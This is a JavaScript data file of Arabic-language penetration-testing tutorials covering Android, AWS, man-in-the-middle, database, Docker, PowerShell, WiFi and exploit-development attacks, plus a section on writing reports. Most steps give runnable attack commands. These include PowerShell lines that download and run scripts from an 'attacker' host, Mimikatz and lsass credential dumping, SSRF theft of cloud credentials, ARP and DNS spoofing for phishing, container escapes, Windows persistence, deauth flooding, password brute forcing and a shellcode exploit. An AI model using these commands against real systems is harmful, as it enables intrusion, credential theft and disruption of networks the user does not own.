    { title:'اختبار Drozer', text:'Drozer يتصل بالجهاز ويختبر المكونات المكشوفة مباشرة. يكتشف Content Providers وActivities المكشوفة.', cmd:'drozer console connect\n# مسح التطبيق:\nrun app.package.info -a com.example.app\nrun app.activity.info -a com.example.app\nrun app.provider.info -a com.example.app\n# استغلال Content Provider:\nrun app.provider.query content://com.example.app.provider/users', cmdDesc:'استخدام Drozer لاختبار مكونات التطبيق' },
    { title:'اعتراض حركة التطبيق بـ Frida', text:'Frida يحقن JavaScript في العملية الجارية لتعديل سلوكها. مفيد لتجاوز SSL Pinning وتحليل التشفير.', cmd:'pip install frida-tools\n# تحميل frida-server على الجهاز:\nadb push frida-server /data/local/tmp/\nadb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"\n# اعتراض SSL:\nfrida -U -n com.example.app -l ssl_bypass.js', cmdDesc:'استخدام Frida لتجاوز SSL Pinning' },
    { title:'تحليل التخزين المحلي', text:'كثير من التطبيقات تخزن بيانات حساسة في SharedPreferences أو SQLite أو ملفات نصية.', cmd:'adb root\nadb shell\nfind /data/data/com.example.app -name "*.db" -o -name "*.xml" -o -name "*.json"\n# نسخ قاعدة البيانات:\nadb pull /data/data/com.example.app/databases/main.db\nsqlite3 main.db ".tables"\nsqlite3 main.db "SELECT * FROM users;"', cmdDesc:'فحص التخزين المحلي للتطبيق' }
  ]
},
{
  id:22, title:'اختبار البنية التحتية السحابية', icon:'☁️', level:'advanced', cat:'cloud',
  tags:['AWS','Cloud','S3','IAM'],
  desc:'اختبار أمان بيئات AWS وتكوينات السحابة الخاطئة.',
  steps:[
    { title:'اكتشاف S3 Buckets المكشوفة', text:'S3 Buckets غير المحمية كثيراً ما تحتوي بيانات حساسة. s3scanner يبحث عن buckets عامة.', cmd:'pip install s3scanner\ns3scanner scan --buckets-file company_names.txt\n# فحص bucket محدد:\naws s3 ls s3://company-bucket --no-sign-request\naws s3 cp s3://company-bucket/sensitive.txt . --no-sign-request', cmdDesc:'اكتشاف S3 Buckets المكشوفة للعموم' },
    { title:'فحص IAM Misconfigurations', text:'صلاحيات IAM الزائدة من أخطر مشاكل AWS. prowler وScout Suite يفحصان الإعدادات.', cmd:'pip install prowler\nprowler aws\n# أو Scout Suite:\npip install scoutsuite\nscout aws --profile default\n# فحص صلاحيات محددة:\naws iam list-users\naws iam get-user-policy --user-name user --policy-name policy', cmdDesc:'فحص إعدادات IAM ورصد التكوينات الخاطئة' },
    { title:'استغلال SSRF للوصول لـ Metadata', text:'في AWS، عنوان 169.254.169.254 يُعطي بيانات الـ instance. SSRF يمكن أن يعطي credentials.', cmd:'# إذا وجدت SSRF:\ncurl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n# استخدام الـ credentials:\nexport AWS_ACCESS_KEY_ID="..."\nexport AWS_SECRET_ACCESS_KEY="..."', cmdDesc:'استغلال SSRF للحصول على AWS credentials' },
    { title:'فحص Lambda Functions', text:'Lambda Functions قد تحتوي environment variables مع secrets أو صلاحيات IAM زائدة.', cmd:'aws lambda list-functions\naws lambda get-function --function-name myFunction\naws lambda get-function-configuration --function-name myFunction | grep -i "env\|var\|secret\|key"', cmdDesc:'فحص AWS Lambda Functions للبحث عن secrets' },
    { title:'تدقيق CloudTrail Logs', text:'CloudTrail يسجل جميع API calls. تحليله يكشف أنشطة مشبوهة وحسابات مخترقة.', cmd:'aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetCallerIdentity\naws cloudtrail get-trail-status --name myTrail\n# تحميل وتحليل logs:\naws s3 sync s3://my-cloudtrail-bucket/logs/ ./cloudtrail_logs/', cmdDesc:'تدقيق CloudTrail للكشف عن نشاط مشبوه' },
    { title:'فحص ECS وKubernetes', text:'بيئات containers قد تكشف API server أو dashboard. kubectl مع صلاحيات مناسبة يكشف أسرار الـ cluster.', cmd:'kubectl get pods --all-namespaces\nkubectl get secrets --all-namespaces\nkubectl exec -it pod_name -- /bin/sh\n# فحص Kubernetes API:\ncurl -k https://k8s-api:6443/api/v1/namespaces', cmdDesc:'فحص أمان Kubernetes Cluster' }
  ]
},
{
  id:23, title:'هجمات Man-in-the-Middle', icon:'🕵️', level:'intermediate', cat:'network',
  tags:['MITM','ARP Spoofing','Bettercap'],
  desc:'تنفيذ هجمات MITM لاعتراض وتحليل حركة الشبكة المشفرة وغير المشفرة.',
  steps:[
    { title:'ARP Spoofing بـ arpspoof', text:'ARP Spoofing يجعل الأجهزة تعتقد أن MAC جهازك هو MAC الراوتر فتمر حركتها عبرك. فعّل IP forwarding أولاً.', cmd:'echo 1 > /proc/sys/net/ipv4/ip_forward\narpspoof -i eth0 -t 192.168.1.100 192.168.1.1  # خداع الضحية\narpspoof -i eth0 -t 192.168.1.1 192.168.1.100  # خداع الراوتر', cmdDesc:'تنفيذ ARP Spoofing لحركة الشبكة', note:'نفذ الأمرين في نافذتين منفصلتين.' },
    { title:'استخدام Bettercap', text:'Bettercap الأداة الأحدث والأقوى من ettercap. تدعم HTTPS, HSTS, WiFi, BLE. واجهة ويب احترافية.', cmd:'sudo bettercap -iface eth0\n# في Bettercap console:\nnet.probe on\narp.spoof.targets 192.168.1.100\narp.spoof on\nnet.sniff on', cmdDesc:'تنفيذ MITM كامل بـ Bettercap' },
    { title:'SSL Stripping وSSL Splitting', text:'بعض المتصفحات تقبل HTTP بدل HTTPS (SSL Stripping). sslstrip يحول HTTPS إلى HTTP لاعتراضه.', cmd:'sudo bettercap -iface eth0\n# في Bettercap:\nset https.proxy.sslstrip true\nhttps.proxy on\narp.spoof on\nnet.sniff on', cmdDesc:'SSL Stripping لاعتراض حركة HTTPS' },
    { title:'اعتراض DNS وDNS Spoofing', text:'DNS Spoofing يحول طلبات DNS لعناوين خاطئة. يُستخدم مع صفحات تصيد.', cmd:'sudo bettercap -iface eth0\n# إعداد DNS Spoofing:\nset dns.spoof.domains target.com,*.target.com\nset dns.spoof.address 192.168.1.5\ndns.spoof on\narp.spoof on', cmdDesc:'إعادة توجيه DNS لصفحة تصيد محلية' },
    { title:'اعتراض Credentials', text:'بعد MITM يمكن التقاط بيانات من HTTP وFTP وTelnet. Bettercap يظهرها مباشرة.', cmd:'sudo bettercap -iface eth0\n# في console:\nset net.sniff.verbose true\nnet.sniff on\n# أو tcpdump:\nsudo tcpdump -i eth0 -A -s 0 port 80 | grep -i "pass\|login\|user\|form"', cmdDesc:'التقاط بيانات الاعتماد من الشبكة', note:'للتعلم فقط في مختبر معزول.' },
    { title:'اعتراض HTTPS بـ mitmproxy', text:'mitmproxy يعترض HTTPS مع CA certificate خاص. الأجهزة تثق بهذه الشهادة تلقائياً بعد تثبيتها.', cmd:'mitmproxy -p 8080\n# أو mitmweb للواجهة الرسومية:\nmitmweb -p 8080\n# على الضحية: ثبت ~/.mitmproxy/mitmproxy-ca-cert.pem', cmdDesc:'اعتراض HTTPS بـ mitmproxy' }
  ]
},
{
  id:24, title:'اختبار أمان قواعد البيانات', icon:'🗄️', level:'intermediate', cat:'database',
  tags:['MySQL','PostgreSQL','MongoDB','Database'],
  desc:'اكتشاف واستغلال نقاط ضعف قواعد البيانات MySQL وPostgreSQL وMongoDB.',
  steps:[
    { title:'فحص MySQL الافتراضي', text:'MySQL يأتي بإعدادات غير آمنة أحياناً. حساب root بدون كلمة مرور، وusers بصلاحيات زائدة.', cmd:'nmap -sV -p 3306 192.168.1.10\nmysql -h 192.168.1.10 -u root  # بدون كلمة مرور\nnmap --script=mysql-info,mysql-empty-password,mysql-databases -p 3306 192.168.1.10', cmdDesc:'فحص MySQL للإعدادات الافتراضية غير الآمنة' },
    { title:'Brute Force كلمات مرور DB', text:'Hydra يدعم MySQL وPostgreSQL مباشرة.', cmd:'hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.10\nhydra -l postgres -P rockyou.txt postgres://192.168.1.10\nmedusa -h 192.168.1.10 -u root -P rockyou.txt -M mysql', cmdDesc:'كسر كلمات مرور قواعد البيانات بـ Brute Force' },
    { title:'استغلال MySQL UDF', text:'إذا كانت لديك صلاحيات MySQL عالية، UDF (User Defined Functions) تسمح بتنفيذ أوامر نظام.', cmd:'# في msfconsole:\nuse exploit/multi/mysql/mysql_udf_payload\nset RHOSTS 192.168.1.10\nset USERNAME root\nset PASSWORD password\nrun', cmdDesc:'رفع صلاحيات عبر MySQL UDF' },
    { title:'فحص PostgreSQL', text:'PostgreSQL يدعم COPY TO/FROM لقراءة/كتابة ملفات. الـ pg_read_file وpg_ls_dir قرائية.', cmd:'psql -h 192.168.1.10 -U postgres\n-- في psql:\nSELECT version();\nSELECT pg_read_file(\'/etc/passwd\');\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM \'id\';', cmdDesc:'استغلال PostgreSQL لتنفيذ أوامر النظام' },
    { title:'MongoDB Authentication Bypass', text:'MongoDB القديم بدون تفعيل auth. تحقق من المنفذ 27017 مفتوحاً بدون مصادقة.', cmd:'nmap -sV -p 27017 192.168.1.10\nmongosh 192.168.1.10:27017  # بدون auth\n# في mongo shell:\nshow dbs\nuse admin\ndb.getUsers()\ndb.system.users.find()', cmdDesc:'الوصول لـ MongoDB بدون مصادقة' },
    { title:'NoSQL Injection', text:'تطبيقات الويب التي تستخدم MongoDB قد تكون عرضة لـ NoSQL Injection عبر JSON objects.', cmd:'# في طلب POST:\ncurl -X POST http://target.com/login -H "Content-Type: application/json" -d "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}"', cmdDesc:'NoSQL Injection لتجاوز المصادقة', note:'$gt: يعني "أكبر من سلسلة فارغة" = جميع القيم.' }
  ]
},
{
  id:25, title:'CTF Techniques والتشفير', icon:'🏆', level:'intermediate', cat:'crypto',
  tags:['CTF','Cryptography','Steganography'],
  desc:'تقنيات وأدوات CTF من تشفير وفك تشفير وإخفاء معلومات.',
  steps:[
    { title:'أدوات فك التشفير الأساسية', text:'CyberChef هو السكين السويسري لفك التشفير. يدعم Base64, Hex, ROT13, XOR, وأكثر من 400 عملية.', cmd:'# في الطرفية:\necho "SGVsbG8=" | base64 -d\necho "48656c6c6f" | xxd -r -p\necho "Hello" | tr a-zA-Z n-za-mN-ZA-M  # ROT13\n# أو استخدم CyberChef:\n# https://gchq.github.io/CyberChef/', cmdDesc:'فك تشفير Base64 وHex وROT13' },
    { title:'استخراج بيانات مخفية (Steganography)', text:'steghide وzsteg وbinwalk يكشفون البيانات المخفية في الصور والملفات.', cmd:'steghide extract -sf image.jpg  # استخراج مخفي\nzsteg -a challenge.png  # فحص PNG\nbinwalk -e suspicious_file  # استخراج ملفات مضمنة\nexiftool image.jpg  # فحص metadata', cmdDesc:'الكشف عن بيانات مخفية في الملفات' },
    { title:'هجمات RSA الشائعة في CTF', text:'RSA ضعيف مع: n صغير (factordb)، نفس n لرسائل مختلفة (Common Modulus)، e صغير (Low Public Exponent).', cmd:'# تحليل n عبر factordb:\npython3\nfrom Crypto.Util.number import *\nimport requests\n# Factor n online: https://factordb.com\n# RsaCtfTool:\npython3 RsaCtfTool.py --publickey key.pub --attack all --uncipherfile cipher.txt', cmdDesc:'استغلال ضعف RSA في تحديات CTF' },
    { title:'تحليل Hash وكسره', text:'أدوات تحديد نوع Hash ثم كسره. CrackStation.net يكسر hashes شائعة مجاناً.', cmd:'hash-identifier\n# أدخل الهاش\nhashid "5f4dcc3b5aa765d61d8327deb882cf99"\n# https://crackstation.net للكسر السريع\nhashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\njohn --format=raw-md5 hash.txt', cmdDesc:'تحديد نوع Hash وكسره' },
    { title:'تحليل ملفات PCAP في CTF', text:'Wireshark وtshark لاستخراج flag من حركة شبكة. ابحث في HTTP Objects وDNS queries.', cmd:'tshark -r challenge.pcap -Y "http" -T fields -e http.file_data | strings | grep -i "flag\|CTF"\ntshark -r challenge.pcap -Y "dns" -T fields -e dns.qry.name | grep -E "[a-zA-Z0-9+/]{20,}"', cmdDesc:'البحث عن Flag في ملفات PCAP' },
    { title:'Format String وBuffer Overflow أساسي', text:'pwn tools لـ binary exploitation. pwntools مكتبة Python قوية للـ CTF pwn challenges.', cmd:'python3 -c "import pwn; pwn.cyclic(100)"  # توليد cyclic pattern\n# binary exploitation أساسي:\n./vulnerable $(python3 -c "print(\'A\'*100)")\ngdb ./vulnerable\n# في gdb:\nrun $(python3 -c "print(\'A\'*100)")\ninfo frame', cmdDesc:'Binary Exploitation أساسي في CTF', note:'pwntools (pip install pwntools) أداة لا غنى عنها لـ PWN challenges.' }
  ]
},
{
  id:26, title:'أمان Docker وContainers', icon:'🐳', level:'advanced', cat:'cloud',
  tags:['Docker','Containers','Escape','Kubernetes'],
  desc:'فحص أمان بيئات Docker واكتشاف ثغرات Container Escape.',
  steps:[
    { title:'تعداد بيئة Docker', text:'عند الوصول لـ container، تحقق أولاً إذا كنت داخله وما الصلاحيات المتاحة.', cmd:'cat /proc/1/cgroup | grep docker  # هل نحن في container؟\nenv | grep -i "docker\|container"\nls /.dockerenv  # يوجد في كل Docker container\ncat /etc/hostname && ip addr', cmdDesc:'الكشف عن بيئة Docker من الداخل' },
    { title:'Privileged Container Escape', text:'Container يعمل بـ --privileged يملك صلاحيات كاملة. يمكن mount الـ host filesystem.', cmd:'fdisk -l  # رؤية أقراص الـ host\nmount /dev/sda1 /mnt\nchroot /mnt /bin/bash\n# الآن داخل الـ host:\nwhoami  # root على الـ host!', cmdDesc:'هروب من Privileged Docker Container' },
    { title:'Docker Socket Escape', text:'إذا كان /var/run/docker.sock مثبتاً داخل container، يمكن التحكم بـ Docker daemon.', cmd:'ls -la /var/run/docker.sock\ncurl --unix-socket /var/run/docker.sock http://localhost/version\n# إنشاء container خبيث بـ host mount:\ncurl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -H "Content-Type: application/json" -d "{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}"', cmdDesc:'استغلال Docker Socket للهروب للـ Host' },
    { title:'فحص صور Docker للثغرات', text:'Trivy وClair يفحصان Docker images للثغرات المعروفة في الحزم والمكتبات.', cmd:'# تثبيت Trivy:\napt install trivy\ntrivy image ubuntu:latest\ntrivy image target-app:v1.0\ntrivy image --severity HIGH,CRITICAL myapp:latest', cmdDesc:'فحص Docker Images للثغرات بـ Trivy' },
    { title:'Kubernetes Pod Security', text:'حسابات الخدمة في K8s قد تملك صلاحيات زائدة. ServiceAccount token مخزن تلقائياً في كل Pod.', cmd:'cat /var/run/secrets/kubernetes.io/serviceaccount/token\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nkubectl --token=$TOKEN get pods --all-namespaces\nkubectl --token=$TOKEN get secrets', cmdDesc:'استغلال Kubernetes ServiceAccount Token' },
    { title:'تدقيق Docker Compose', text:'docker-compose.yml كثيراً ما يحتوي secrets وكلمات مرور كنص واضح في environment variables.', cmd:'find / -name "docker-compose.yml" 2>/dev/null\ngrep -r "password\|secret\|token\|key" docker-compose.yml\ncat .env  # ملف متغيرات البيئة المرافق', cmdDesc:'البحث عن Secrets في ملفات Docker Compose', note:'دائماً استخدم Docker Secrets أو Vault بدلاً من متغيرات البيئة.' }
  ]
},
{
  id:27, title:'PowerShell للاختبار والهجوم', icon:'💻', level:'advanced', cat:'exploitation',
  tags:['PowerShell','Windows','Empire','Post-Exploitation'],
  desc:'استخدام PowerShell كأداة قوية للاختبار والـ Post-Exploitation في بيئات Windows.',
  steps:[
    { title:'تجاوز Execution Policy', text:'Windows يمنع تشغيل scripts بالافتراضي. هناك طرق عديدة لتجاوز ExecutionPolicy بدون صلاحيات admin.', cmd:'powershell -ExecutionPolicy Bypass -File script.ps1\npowershell -enc BASE64_ENCODED_COMMAND\nSet-ExecutionPolicy Bypass -Scope Process -Force\n# تشغيل script من web مباشرة:\nIEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")', cmdDesc:'تجاوز Execution Policy في PowerShell' },
    { title:'PowerView لاستطلاع AD', text:'PowerView (من PowerSploit) يستطلع Active Directory بطريقة احترافية. يعطي معلومات شاملة عن المستخدمين والمجموعات.', cmd:'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")\nGet-Domain\nGet-DomainUser\nGet-DomainGroup "Domain Admins" | Select -ExpandProperty Member\nGet-DomainComputer | Select Name, OperatingSystem', cmdDesc:'استطلاع Active Directory بـ PowerView' },
    { title:'PowerShell Empire', text:'Empire إطار عمل Post-Exploitation بالكامل في PowerShell. يتجنب antivirus ويدعم مئات المديولات.', cmd:'# تثبيت Empire:\ngit clone https://github.com/BC-SECURITY/Empire.git\ncd Empire && ./setup/install.sh\npowershell-empire server\n# في نافذة أخرى:\npowershell-empire client\n# أنشئ listener وstager:\nlisteners\ncreate http\nset Name http_listener\nexecute', cmdDesc:'إعداد PowerShell Empire للـ Post-Exploitation' },
    { title:'سرقة Credentials من الذاكرة', text:'Invoke-Mimikatz يستخرج كلمات المرور مباشرة من ذاكرة lsass.exe. يحتاج صلاحيات Admin.', cmd:'# تشغيل Mimikatz في PowerShell:\nIEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")\nInvoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"\n# أو بـ comsvcs.dll:\ntasklist | findstr lsass\nrundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump LSASS_PID lsass.dmp full', cmdDesc:'استخراج كلمات المرور من ذاكرة Windows' },
    { title:'Lateral Movement بـ PowerShell', text:'WMI وPSExec وWinRM طرق لتنفيذ أوامر على أجهزة أخرى في الشبكة باستخدام credentials.', cmd:'# WMI:\nInvoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > c:\\output.txt"\n# WinRM:\nEnter-PSSession -ComputerName target -Credential domain\\user\nInvoke-Command -ComputerName target -Credential $cred -ScriptBlock {whoami}', cmdDesc:'التحرك الجانبي بين الأجهزة في الشبكة' },
    { title:'الاستمرارية في Windows', text:'طرق إضافة persistence في Windows: Registry Run keys، Task Scheduler، WMI Subscriptions.', cmd:'# Registry Run Key:\nReg Add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "C:\\Users\\Public\\payload.exe"\n# Task Scheduler:\nschtasks /create /tn "WindowsUpdate" /tr "C:\\Public\\payload.exe" /sc ONLOGON /ru SYSTEM\n# WMI Subscription (أصعب كشفاً):', cmdDesc:'إضافة Persistence في Windows', note:'استخدم هذه التقنيات فقط في بيئة اختبار مرخصة.' }
  ]
},
{
  id:28, title:'اختبار أمان Wireless الشامل', icon:'📡', level:'advanced', cat:'wireless',
  tags:['WiFi','WPA3','Evil Twin','802.11'],
  desc:'هجمات متقدمة على شبكات WiFi من Evil Twin إلى WPA3 Dragonblood.',
  steps:[
    { title:'تهيئة بيئة الاختبار اللاسلكي', text:'تحتاج محول WiFi يدعم Monitor Mode وPacket Injection. Alfa AWUS036AXM (WiFi 6) من أفضل الخيارات حالياً.', cmd:'sudo airmon-ng check kill\nsudo airmon-ng start wlan0\niwconfig wlan0mon\n# التحقق من Injection:\nsudo aireplay-ng --test wlan0mon', cmdDesc:'تفعيل Monitor Mode والتحقق من Packet Injection' },
    { title:'Evil Twin Attack', text:'نقطة وصول وهمية بنفس اسم الشبكة الحقيقية (SSID). Hostapd-WPE يثبت WPA Enterprise Evil Twin.', cmd:'# إعداد Evil Twin بسيط مع airbase-ng:\nairbase-ng -e "TargetWiFi" -c 6 wlan0mon\n# ثم ضبط DHCP:\nifconfig at0 up 10.0.0.1/24\necho "dhcp-range=10.0.0.2,10.0.0.10,255.255.255.0,12h" > dnsmasq.conf\ndnsmasq -C dnsmasq.conf\n# أو استخدم hostapd-wpe للـ WPA Enterprise', cmdDesc:'إنشاء Evil Twin Access Point' },
    { title:'PMKID Attack على WPA2', text:'PMKID Capture لا يحتاج handshake كامل - حزمة واحدة من AP تكفي. أسرع من هجوم handshake التقليدي.', cmd:'sudo hcxdumptool -o pmkid_capture.pcapng -i wlan0mon --enable_status=1\n# Ctrl+C بعد دقائق\nhcxpcapngtool -o hashes.hc22000 pmkid_capture.pcapng\nhashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt', cmdDesc:'PMKID Attack على WPA2 بدون handshake كامل' },
    { title:'WPA Enterprise - اختبار RADIUS', text:'WPA Enterprise يستخدم RADIUS server. hostapd-wpe يستطيع التقاط بيانات اعتماد MSCHAPV2.', cmd:'apt install hostapd-wpe\n# عدل hostapd-wpe.conf:\n# ssid=TargetEnterprise\n# interface=wlan0mon\nsudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf\n# انتظر اتصال ضحية\n# فك تشفير MSCHAPV2:\nasleap -C challenge -R response -W rockyou.txt', cmdDesc:'اختبار WPA Enterprise واستخراج بيانات الاعتماد' },
    { title:'Deauthentication Flood', text:'إرسال حزم deauth يفصل العملاء عن الشبكة. aireplay-ng وmdk4 يدعمان هذا الهجوم.', cmd:'sudo aireplay-ng --deauth 0 -a BSSID wlan0mon  # هجوم مستمر\nsudo aireplay-ng --deauth 10 -a BSSID -c CLIENT_MAC wlan0mon  # هجوم موجه\n# أو mdk4:\nsudo mdk4 wlan0mon d -b blacklist.txt', cmdDesc:'هجوم Deauthentication لفصل العملاء', note:'هذا الهجوم يُعد تشويشاً (Jamming) وهو غير قانوني بدون إذن.' },
    { title:'WPA3 Dragonblood', text:'WPA3 SAE (Dragonfly) عرضة لهجمات Dragonblood. dragonblood tools تختبر هذه الثغرات.', cmd:'git clone https://github.com/vanhoefm/dragonblood.git\ncd dragonblood\n# هجوم timing attack:\npython3 dragonforce.py -i wlan0mon -t TARGET_BSSID\n# هجوم cache-based:\npython3 dragonblood.py wlan0mon TARGET_BSSID', cmdDesc:'اختبار ثغرات WPA3 Dragonblood' }
  ]
},
{
  id:29, title:'البحث عن Vulnerabilities وكتابة Exploits', icon:'🔬', level:'advanced', cat:'exploitation',
  tags:['Vulnerability Research','Exploit Dev','Buffer Overflow','ROP'],
  desc:'أساسيات البحث عن الثغرات وكتابة exploits من Buffer Overflow إلى ROP Chains.',
  steps:[
    { title:'تحليل Binary بـ GDB وPEDA', text:'GDB هو debugger Linux الأساسي. PEDA (Python Exploit Development Assistance) يضيف ميزات قوية.', cmd:'git clone https://github.com/longld/peda.git ~/peda\necho "source ~/peda/peda.py" >> ~/.gdbinit\ngdb ./vulnerable_binary\n# في GDB-PEDA:\nrun\ninfo registers\ndisassemble main\nx/20x $esp  # فحص Stack', cmdDesc:'تحليل Binary بـ GDB مع PEDA' },
    { title:'تحديد حجم Buffer للـ Overflow', text:'cyclic pattern يساعد في تحديد offset الدقيق حين يُكتب في EIP/RIP.', cmd:'python3 -c "from pwn import *; print(cyclic(200))" > pattern.txt\ngdb ./vuln\nrun < pattern.txt\n# بعد crash:\npython3 -c "from pwn import *; print(cyclic_find(0x61616166))"', cmdDesc:'تحديد offset للـ Return Address بدقة' },
    { title:'كتابة Exploit بسيط', text:'بعد معرفة offset، اكتب exploit يكتب عنوان shellcode في EIP مع NOP sled.', cmd:'from pwn import *\n\np = process("./vulnerable")\noffset = 112  # تحدده من الخطوة السابقة\nnop_sled = b"\\x90" * 50\nshellcode = asm(shellcraft.linux.sh())  # /bin/sh shellcode\n\nexploit = b"A" * offset\nexploit += p32(0xbffff5a0)  # عنوان NOP sled\nexploit += nop_sled + shellcode\n\np.sendline(exploit)\np.interactive()', cmdDesc:'كتابة Buffer Overflow Exploit بـ pwntools' },
    { title:'ROP (Return Oriented Programming)', text:'مع NX/DEP المفعّل، لا يمكن تشغيل shellcode في Stack. ROP يستخدم gadgets موجودة في الـ binary.', cmd:'# إيجاد ROP gadgets:\nROPgadget --binary ./vulnerable --rop\n# أو ropper:\nropper -f ./vulnerable --search "pop rdi; ret"\n# pwntools ROPgadget:\nfrom pwn import *\nbinary = ELF("./vulnerable")\nrop = ROP(binary)\nrop.call("system", [next(binary.search(b"/bin/sh"))])\nprint(rop.dump())', cmdDesc:'بناء ROP Chain لتجاوز NX/DEP' },
    { title:'Format String Vulnerability', text:'printf(user_input) بدون format string ثغرة خطيرة. تسمح بقراءة وكتابة ذاكرة عشوائية.', cmd:'# قراءة Stack:\n./vuln "$(python3 -c "print(\\'%p %p %p %p %p\\')") "\n# قراءة عنوان محدد:\n./vuln "$(python3 -c "import struct; print(struct.pack(\'<I\', 0x804a020) + \'%7$s\')") "\n# كتابة في ذاكرة (%n):\n# خطر جداً - استخدم pwntools formatstr_payload', cmdDesc:'استغلال Format String Vulnerability' },
    { title:'Fuzzing للبحث عن Bugs', text:'AFL++ (American Fuzzy Lop) أفضل fuzzer حالياً. يغطي المسارات بشكل ذكي.', cmd:'apt install afl++\n# تجميع البرنامج مع AFL instrumentation:\nafl-clang-fast -o vuln_afl ./vulnerable.c\n# بدء الـ fuzzing:\nmkdir -p in out\necho "test" > in/seed.txt\nafl-fuzz -i in -o out -- ./vuln_afl @@', cmdDesc:'Fuzzing باستخدام AFL++ للبحث عن ثغرات تلقائياً', note:'AFL++ يحتاج وقتاً طويلاً. اتركه يعمل ساعات للحصول على نتائج.' }
  ]
},
{
  id:30, title:'التقارير والتوثيق الاحترافي', icon:'📋', level:'beginner', cat:'basics',
  tags:['Pentest Report','Documentation','Professional'],
  desc:'كيفية توثيق اختبارات الاختراق وكتابة تقارير احترافية تُرضي العملاء.',
  steps:[
    { title:'هيكل تقرير اختبار الاختراق', text:'التقرير الاحترافي يحتوي: Executive Summary، Methodology، Findings، Risk Rating، Remediation. هذا ما يقيّمك العملاء عليه.', cmd:'# هيكل التقرير:\n# 1. ملخص تنفيذي (Executive Summary)\n# 2. نطاق الاختبار (Scope)\n# 3. المنهجية المتبعة (Methodology)\n# 4. النتائج والثغرات (Findings)\n# 5. التوصيات والإصلاحات (Remediation)\n# 6. الملاحق (Appendices)\nrecon-ng > export report  # تصدير نتائج Recon', cmdDesc:'هيكل تقرير اختبار الاختراق الاحترافي' },
    { title:'تقييم الخطورة CVSS', text:'CVSS (Common Vulnerability Scoring System) معيار عالمي لتقييم خطورة الثغرات. الأداة الرسمية على nvd.nist.gov.', cmd:'# CVSS v3.1 درجات الخطورة:\n# 0.0: None\n# 0.1-3.9: Low\n# 4.0-6.9: Medium\n# 7.0-8.9: High\n# 9.0-10.0: Critical\n# استخدم CVSS Calculator:\n# https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator', cmdDesc:'حساب درجة خطورة الثغرات بـ CVSS' },
    { title:'أدوات توليد التقارير', text:'Dradis وFaraday يجمعان نتائج الأدوات المختلفة ويولدان تقارير احترافية. Serpico أيضاً خيار ممتاز.', cmd:'# Dradis:\ngit clone https://github.com/dradis/dradis-ce.git\ncd dradis-ce && bundle install\nrails server\n# يعمل على http://localhost:3000\n# Faraday:\npip3 install faraday-cli\nfaraday-cli\nopen https://localhost:5985', cmdDesc:'إعداد Dradis لإدارة نتائج اختبار الاختراق' },
    { title:'لقطات الشاشة والتوثيق', text:'كل ثغرة تحتاج لقطة شاشة تثبتها. flameshot أفضل أداة لالتقاط الشاشة مع تعليقات.', cmd:'apt install flameshot\nflameshot gui  # التقاط تفاعلي مع تعليق\n# تسجيل الطرفية:\nscript -a pentest_session.log\n# كل ما تكتبه يُسجَّل\n# tmux أيضاً يسجل الجلسات:\ntmux new-session -s pentest\n# Ctrl+B : capture-pane -p > session_log.txt', cmdDesc:'توثيق الأدلة ولقطات الشاشة' },
    { title:'نماذج تقارير جاهزة', text:'TCM Security وHackerOne يوفران نماذج تقارير مجانية. استخدمها كنقطة انطلاق.', cmd:'# نموذج إيجاد ثغرة:\n# العنوان: SQL Injection في صفحة تسجيل الدخول\n# الخطورة: Critical (CVSS 9.8)\n# الوصف: [وصف تقني مفصل]\n# الدليل: [لقطة شاشة + PoC Command]\n# التأثير: [ماذا يمكن للمهاجم فعله]\n# الحل: [كيفية الإصلاح]\n# المراجع: [CVE, OWASP, NVD]', cmdDesc:'نموذج توثيق ثغرة احترافي', note:'TCM Security يوفر نموذج تقرير PDF مجاني للتحميل.' },
    { title:'المعايير والامتثال', text:'OWASP Top 10، PTES، OSSTMM معايير مقبولة دولياً. ذكرها في تقريرك يزيد مصداقيته.', cmd:'# المعايير المقبولة:\n# - OWASP Top 10 (تطبيقات ويب)\n# - PTES (Penetration Testing Execution Standard)\n# - NIST SP 800-115\n# - OSSTMM (Open Source Security Testing Manual)\n# موارد مجانية:\n# https://owasp.org/Top10/\n# http://www.pentest-standard.org/', cmdDesc:'معايير اختبار الاختراق الدولية' }
  ]
}
];

// دمج الدروس الإضافية مع الأصلية
if (typeof TUTORIALS !== 'undefined') {
  TUTORIALS.push(...TUTORIALS_EXTRA);
}
